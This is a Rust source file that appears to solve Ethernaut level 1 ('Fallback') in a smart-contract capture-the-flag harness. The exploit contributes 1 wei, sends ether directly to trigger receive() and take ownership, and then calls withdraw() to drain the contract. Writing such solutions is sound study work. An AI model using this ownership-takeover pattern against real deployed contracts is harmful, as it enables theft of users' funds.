use alloy::primitives::U256;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethernaut::lvl01_fallback::*;

pub struct Exploit;
#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let contract =
            Fallback::new(target.address, offender.provider().clone());

        println!("Calling contribute()...");
        contract
            .contribute()
            .value(U256::from(1))
            .from(offender.address())
            .send()
            .await?
            .watch()
            .await?;

        println!("Calling receive()...");
        offender.transfer(target.address, U256::from(1)).await?;

        println!("Calling withdraw()...");
        contract
            .withdraw()
            .from(offender.address())
            .send()
            .await?
            .watch()
            .await?;

        Ok(())
    }
}
